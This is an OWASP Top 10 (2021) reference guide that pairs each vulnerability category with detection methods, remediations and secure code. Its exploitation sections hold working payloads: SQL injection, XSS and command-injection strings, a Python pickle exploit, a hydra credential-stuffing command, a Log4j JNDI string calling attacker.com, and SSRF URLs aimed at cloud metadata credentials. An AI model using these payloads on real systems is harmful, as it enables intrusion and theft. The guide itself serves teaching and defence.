# OWASP Top 10 (2021) — Detailed Reference

Complete reference for each OWASP Top 10 category with detection methods, exploitation techniques, remediation, and code examples.

## Table of Contents

- [A01:2021 — Broken Access Control](#a012021--broken-access-control)
  - [Description](#description)
  - [Detection Methods](#detection-methods)
  - [Exploitation Techniques](#exploitation-techniques)
  - [Remediation](#remediation)
  - [Code Examples](#code-examples)
- [A02:2021 — Cryptographic Failures](#a022021--cryptographic-failures)
  - [Description](#description-1)
  - [Detection Methods](#detection-methods-1)
  - [Exploitation Techniques](#exploitation-techniques-1)
  - [Remediation](#remediation-1)
  - [Code Examples](#code-examples-1)
- [A03:2021 — Injection](#a032021--injection)
  - [Description](#description-2)
  - [Detection Methods](#detection-methods-2)
  - [Exploitation Techniques](#exploitation-techniques-2)
  - [Remediation](#remediation-2)
  - [Code Examples](#code-examples-2)
- [A04:2021 — Insecure Design](#a042021--insecure-design)
  - [Description](#description-3)
  - [Detection Methods](#detection-methods-3)
  - [Exploitation Techniques](#exploitation-techniques-3)
  - [Remediation](#remediation-3)
  - [Code Examples](#code-examples-3)
- [A05:2021 — Security Misconfiguration](#a052021--security-misconfiguration)
  - [Description](#description-4)
  - [Detection Methods](#detection-methods-4)
  - [Exploitation Techniques](#exploitation-techniques-4)
  - [Remediation](#remediation-4)
  - [Security Headers](#security-headers)
- [A06:2021 — Vulnerable and Outdated Components](#a062021--vulnerable-and-outdated-components)
  - [Description](#description-5)
  - [Detection Methods](#detection-methods-5)
  - [Exploitation Techniques](#exploitation-techniques-5)
  - [Remediation](#remediation-5)
- [A07:2021 — Identification and Authentication Failures](#a072021--identification-and-authentication-failures)
  - [Description](#description-6)
  - [Detection Methods](#detection-methods-6)
  - [Exploitation Techniques](#exploitation-techniques-6)
  - [Remediation](#remediation-6)
- [A08:2021 — Software and Data Integrity Failures](#a082021--software-and-data-integrity-failures)
  - [Description](#description-7)
  - [Detection Methods](#detection-methods-7)
  - [Exploitation Techniques](#exploitation-techniques-7)
  - [Remediation](#remediation-7)
- [A09:2021 — Security Logging and Monitoring Failures](#a092021--security-logging-and-monitoring-failures)
  - [Description](#description-8)
  - [Detection Methods](#detection-methods-8)
  - [Exploitation Techniques](#exploitation-techniques-8)
  - [Remediation](#remediation-8)
  - [Code Example](#code-example)
- [A10:2021 — Server-Side Request Forgery (SSRF)](#a102021--server-side-request-forgery-ssrf)
  - [Description](#description-9)
  - [Detection Methods](#detection-methods-9)
  - [Exploitation Techniques](#exploitation-techniques-9)
  - [Remediation](#remediation-9)
  - [Code Example](#code-example-1)

---

## A01:2021 — Broken Access Control

### Description

Access control enforces policy such that users cannot act outside their intended permissions. Failures lead to unauthorized information disclosure, modification, or destruction of all data, or performing a business function outside the user's limits.

### Detection Methods

| Method | What to Look For |
|--------|-----------------|
| **Manual code review** | Endpoints without authorization checks |
| **IDOR testing** | Modify object IDs in requests |
| **Privilege escalation** | Change role/scope parameters |
| **CORS analysis** | Overly permissive cross-origin policies |
| **JWT inspection** | Algorithm confusion, missing signature verification |
| **Metadata manipulation** | Hidden fields, cookies, headers |

### Exploitation Techniques

**IDOR (Insecure Direct Object Reference):**
```
GET /api/documents/1001  → 200 OK (your document)
GET /api/documents/1002  → 200 OK (someone else's document!)
```

**Privilege Escalation:**
```json
// Request with modified role
POST /api/user/update
{
    "user_id": 1234,
    "role": "admin"  // Client-side role manipulation
}
```

**CORS Misconfiguration:**
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Remediation

1. **Deny by default** — Explicitly grant access, never assume
2. **Verify ownership** — Check resource ownership on every request
3. **Server-side authorization** — Never trust client-side role/scope
4. **Use RBAC/ABAC** — Implement role-based or attribute-based access control
5. **CORS whitelist** — Specify exact origins, never use `*` with credentials
6. **Rate limiting** — Prevent enumeration attacks

### Code Examples

**Vulnerable — Missing Authorization:**
```python
@app.route('/api/admin/users')
def list_users():
    # No admin check!
    return jsonify([u.to_dict() for u in User.query.all()])
```

**Secure — Proper Authorization:**
```python
@app.route('/api/admin/users')
@require_admin
def list_users():
    return jsonify([u.to_dict() for u in User.query.all()])

def require_admin(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not current_user.is_authenticated or not current_user.is_admin:
            abort(403)
        return f(*args, **kwargs)
    return decorated
```

---

## A02:2021 — Cryptographic Failures

### Description

Failures related to cryptography (or lack thereof) often lead to exposure of sensitive data. This includes weak algorithms, improper key management, lack of encryption in transit/at rest, and improper random number generation.

### Detection Methods

| Method | What to Look For |
|--------|-----------------|
| **Code search** | Hardcoded keys, passwords, secrets |
| **Algorithm audit** | MD5, SHA1, DES, RC4, ECB mode |
| **TLS assessment** | SSL Labs scan, weak cipher suites |
| **Random analysis** | `random.random()`, `Math.random()` for tokens |
| **Storage review** | Unencrypted sensitive data at rest |

### Exploitation Techniques

**Weak Hash Cracking:**
```bash
# MD5/SHA1 hashes cracked with rainbow tables
echo -n "password" | md5sum
# Look up in crackstation.net

# GPU-accelerated cracking
hashcat -m 0 hash.txt wordlist.txt
```

**Predictable Tokens:**
```python
# If token = random.randint(100000, 999999)
# Only 900K possibilities — brute force in seconds
for token in range(100000, 1000000):
    if try_token(token):
        print(f"Found: {token}")
```

### Remediation

1. **Use strong algorithms** — AES-256-GCM, ChaCha20-Poly1305, SHA-256+
2. **Key management** — Environment variables, vaults, HSMs
3. **TLS everywhere** — Enforce HTTPS, HSTS header
4. **Encrypt at rest** — Database encryption, disk encryption
5. **Secure random** — `secrets`, `crypto/rand`, `SecureRandom`

### Code Examples

**Vulnerable — Weak Hash:**
```python
import hashlib
hash = hashlib.md5(password.encode()).hexdigest()  # Broken!
```

**Secure — Strong Hash:**
```python
import bcrypt
salt = bcrypt.gensalt(rounds=12)
hash = bcrypt.hashpw(password.encode(), salt)
```

---

## A03:2021 — Injection

### Description

Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.

### Detection Methods

| Method | What to Look For |
|--------|-----------------|
| **Code review** | String concatenation in queries/commands |
| **Input testing** | Special characters in all input fields |
| **Automated scanning** | SQLMap, XSStrike, Commix |
| **ORM audit** | Raw query methods with interpolation |

### Exploitation Techniques

**SQL Injection:**
```sql
-- Authentication bypass
admin'--
' OR '1'='1'--

-- Union-based extraction
' UNION SELECT null, username, password FROM users--

-- Time-based blind
'; IF(1=1) WAITFOR DELAY '0:0:5'--
```

**XSS:**
```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
```

**Command Injection:**
```bash
; cat /etc/passwd
| whoami
`id`
$(id)
&& ls -la
```

### Remediation

1. **Parameterized queries** — Never concatenate SQL
2. **Output encoding** — Context-aware encoding (HTML, JS, URL, CSS)
3. **Input validation** — Whitelist allowed characters/patterns
4. **Least privilege** — DB accounts with minimal permissions
5. **WAF** — Web Application Firewall as defense-in-depth

### Code Examples

**Vulnerable — SQL Injection:**
```python
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)
```

**Secure — Parameterized:**
```python
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

---

## A04:2021 — Insecure Design

### Description

Insecure design is a broad category representing different weaknesses expressed as "missing or ineffective control design." This is distinct from implementation flaws — even a perfect implementation cannot fix a flawed design.

### Detection Methods

| Method | What to Look For |
|--------|-----------------|
| **Threat modeling** | Was threat modeling performed? |
| **Design review** | Missing security controls in architecture |
| **Workflow analysis** | Can steps be skipped or reordered? |
| **Rate limiting** | Are sensitive operations rate-limited? |
| **Transaction integrity** | Are multi-step operations atomic? |

### Exploitation Techniques

**Workflow Bypass:**
```
Step 1: Add items to cart
Step 2: Apply coupon
Step 3: Checkout
Step 4: Pay

Attack: Skip Step 4 by calling /api/confirm directly
```

**Race Condition:**
```python
# Two concurrent requests both pass balance check
# Both withdraw, resulting in negative balance
if account.balance >= amount:
    account.balance -= amount  # TOCTOU vulnerability
```

### Remediation

1. **Threat modeling** — STRIDE, PASTA during design phase
2. **Secure design patterns** — Defense in depth, least privilege
3. **Rate limiting** — On all sensitive operations
4. **State machines** — Enforce valid state transitions
5. **Atomic operations** — Database transactions for multi-step operations

### Code Examples

**Vulnerable — No Rate Limiting:**
```python
@app.route('/api/transfer', methods=['POST'])
def transfer():
    # No rate limit — can be called thousands of times
    do_transfer(request.json)
```

**Secure — Rate Limited:**
```python
@app.route('/api/transfer', methods=['POST'])
@limiter.limit("5 per minute")
@require_confirmation  # 2FA or email confirmation
def transfer():
    do_transfer(request.json)
```

---

## A05:2021 — Security Misconfiguration

### Description

The most commonly seen issue. Often caused by incomplete or ad-hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information.

### Detection Methods

| Method | What to Look For |
|--------|-----------------|
| **Header analysis** | Missing security headers |
| **Default creds** | Default passwords on services |
| **Error handling** | Stack traces in production |
| **Port scan** | Unnecessary open ports/services |
| **Cloud config** | Public S3 buckets, open databases |

### Exploitation Techniques

**Default Credentials:**
```
admin:admin
admin:password
root:root
guest:guest
```

**Information Disclosure:**
```
GET /nonexistent-page
→ Stack trace reveals: /var/www/app/routes.py line 42
→ Database: PostgreSQL 13.4
→ Framework: Flask 2.0.1
```

### Remediation

1. **Hardening guides** — CIS Benchmarks, vendor guidelines
2. **Security headers** — CSP, HSTS, X-Frame-Options, etc.
3. **Error handling** — Generic errors in production
4. **Minimal surface** — Disable unnecessary features
5. **Automated scanning** — Regular configuration audits

### Security Headers

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

---

## A06:2021 — Vulnerable and Outdated Components

### Description

Components run with the same privileges as the application. Vulnerable components can lead to serious breaches. This includes unpatched libraries, frameworks, and other software modules.

### Detection Methods

| Method | Command |
|--------|---------|
| **Node.js** | `npm audit` |
| **Python** | `safety check`, `pip-audit` |
| **Java** | `owasp-dependency-check` |
| **Go** | `govulncheck ./...` |
| **Rust** | `cargo audit` |
| **Multi** | `snyk test` |

### Exploitation Techniques

```bash
# Check if target uses known-vulnerable version
# Example: Log4j (CVE-2021-44228)
curl -H "X-Api-Version: ${jndi:ldap://attacker.com/a}" https://target.com/

# Check dependency versions
curl -s https://target.com/package.json | jq '.dependencies'
```

### Remediation

1. **Inventory** — Maintain software bill of materials (SBOM)
2. **Automated scanning** — Integrate into CI/CD pipeline
3. **Patch management** — Apply security patches within SLA
4. **Virtual patching** — WAF rules for known CVEs
5. **Replace** — Switch to maintained alternatives

---

## A07:2021 — Identification and Authentication Failures

### Description

Confirmation of user identity, authentication, and session management is critical to protect against authentication-related attacks. This includes weak passwords, session management flaws, and missing MFA.

### Detection Methods

| Method | What to Look For |
|--------|-----------------|
| **Password policy** | Minimum length, complexity requirements |
| **Session analysis** | Session ID regeneration, timeout |
| **MFA** | Is multi-factor authentication supported? |
| **Brute force** | Account lockout after failed attempts |
| **Credential stuffing** | Protection against leaked credentials |

### Exploitation Techniques

**Session Fixation:**
```
1. Attacker obtains valid session ID
2. Attacker tricks victim into using that session ID
3. Victim logs in — session ID unchanged
4. Attacker now has authenticated session
```

**Credential Stuffing:**
```bash
# Using leaked credentials from previous breaches
hydra -C passwords.txt https://target.com/login http-post-form
```

### Remediation

1. **Strong password policy** — Minimum 12 characters, complexity
2. **MFA** — Require multi-factor authentication
3. **Session management** — Regenerate IDs, enforce timeouts
4. **Account lockout** — Temporary lockout after failed attempts
5. **Breach detection** — Check passwords against known breaches (HaveIBeenPwned API)

---

## A08:2021 — Software and Data Integrity Failures

### Description

Relies on software updates, critical data, and CI/CD pipelines without verifying integrity. Insecure deserialization is a subset — deserializing untrusted data can lead to remote code execution.

### Detection Methods

| Method | What to Look For |
|--------|-----------------|
| **Deserialization** | `pickle.loads()`, `ObjectInputStream` |
| **CI/CD** | Unsigned pipelines, missing integrity checks |
| **Updates** | Unsigned or unverified software updates |
| **Cache** | Missing integrity checks on cached data |

### Exploitation Techniques

**Insecure Deserialization (Python Pickle):**
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd',))

payload = pickle.dumps(Exploit())
# Send payload to application that calls pickle.loads()
```

### Remediation

1. **Avoid deserialization** — Use JSON, Protocol Buffers
2. **Integrity verification** — Sign serialized data
3. **CI/CD security** — Signed pipelines, access controls
4. **Update verification** — Code signing, checksums

---

## A09:2021 — Security Logging and Monitoring Failures

### Description

Without proper logging and monitoring, breaches can go undetected. The average time to identify a breach is 200+ days. Insufficient logging, monitoring, and alerting allows attackers to continue attacks undetected.

### Detection Methods

| Method | What to Look For |
|--------|-----------------|
| **Log review** | Are authentication events logged? |
| **Monitoring** | Are alerts configured for suspicious activity? |
| **Audit trail** | Can sensitive operations be traced? |
| **Log storage** | Are logs stored securely and centrally? |

### Exploitation Techniques

```
Attacker exploits vulnerability → No logging → Attacker persists
→ No monitoring → Attacker exfiltrates data → No alert → Breach undetected
```

### Remediation

1. **Log all auth events** — Success and failure
2. **Log access control** — Denied access attempts
3. **Centralized logging** — SIEM, log aggregation
4. **Alerting** — Real-time alerts for suspicious activity
5. **Retention** — Store logs for sufficient duration (90+ days)

### Code Example

```python
# SECURE: Comprehensive security logging
import structlog

logger = structlog.get_logger()

def security_event(event_type, user, details, ip_address):
    logger.warning(
        "security_event",
        event_type=event_type,
        user_id=user.id if user else None,
        ip_address=ip_address,
        details=details,
        timestamp=datetime.utcnow().isoformat()
    )

# Usage
security_event("auth_failed", None, {"username": username}, request.remote_addr)
security_event("access_denied", current_user, {"resource": resource_id}, request.remote_addr)
security_event("privilege_escalation", current_user, {"attempted_role": "admin"}, request.remote_addr)
```

---

## A10:2021 — Server-Side Request Forgery (SSRF)

### Description

SSRF flaws occur when a web application fetches a remote resource without validating the user-supplied URL. This allows an attacker to coerce the application to send a crafted request to an unexpected destination.

### Detection Methods

| Method | What to Look For |
|--------|-----------------|
| **URL parameters** | User-supplied URLs in requests |
| **Internal access** | Can attacker reach internal services? |
| **Cloud metadata** | Can attacker access 169.254.169.254? |
| **Port scanning** | Can attacker scan internal ports? |

### Exploitation Techniques

**Cloud Metadata Access:**
```
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ Returns AWS IAM credentials
```

**Internal Port Scanning:**
```
http://target.com/fetch?url=http://localhost:6379/  → Redis
http://target.com/fetch?url=http://localhost:3306/  → MySQL
http://target.com/fetch?url=http://localhost:9200/  → Elasticsearch
```

**File Protocol:**
```
http://target.com/fetch?url=file:///etc/passwd
```

### Remediation

1. **URL validation** — Whitelist allowed domains/schemes
2. **Block internal ranges** — 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16
3. **Disable redirects** — Don't follow HTTP redirects
4. **Network segmentation** — Application server can't reach internal services
5. **Allowlist** — Only fetch from known-good domains

### Code Example

```python
# SECURE: SSRF protection
import ipaddress
import socket
from urllib.parse import urlparse

BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('0.0.0.0/8'),
]

ALLOWED_SCHEMES = {'http', 'https'}

def validate_url(url):
    parsed = urlparse(url)
    
    # Scheme check
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    
    # Resolve hostname
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
    except (socket.gaierror, ValueError):
        return False
    
    # Check against blocked networks
    if any(ip in net for net in BLOCKED_NETWORKS):
        return False
    
    return True

@app.route('/api/fetch')
def fetch_url():
    url = request.args.get('url')
    if not validate_url(url):
        abort(400, description="URL not allowed")
    response = requests.get(url, timeout=5, allow_redirects=False)
    return response.text
```
